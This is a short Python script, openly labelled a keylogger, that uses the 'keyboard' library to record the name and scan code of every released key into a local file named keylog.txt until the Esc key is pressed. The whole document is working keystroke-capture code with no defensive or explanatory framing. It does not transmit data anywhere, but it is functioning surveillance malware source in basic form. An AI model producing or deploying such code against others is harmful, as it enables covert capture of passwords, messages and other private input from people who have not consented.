import keyboard

# Function to start the keylogger
def start_keylogger():
    with open("keylog.txt", "w") as log_file:
        log_file.write("Started Keylogger...\n")
        log_file.write("=============================================\n")

        def on_key_event(event):
            log_file.write(f"[{event.name}] - {event.scan_code}\n")

        keyboard.on_release(on_key_event)

        # Keep the program running until Esc is pressed
        keyboard.wait("esc")

        log_file.write("=============================================\n")
        log_file.write("Keylogger Stopped.")

if __name__ == "__main__":
    start_keylogger()
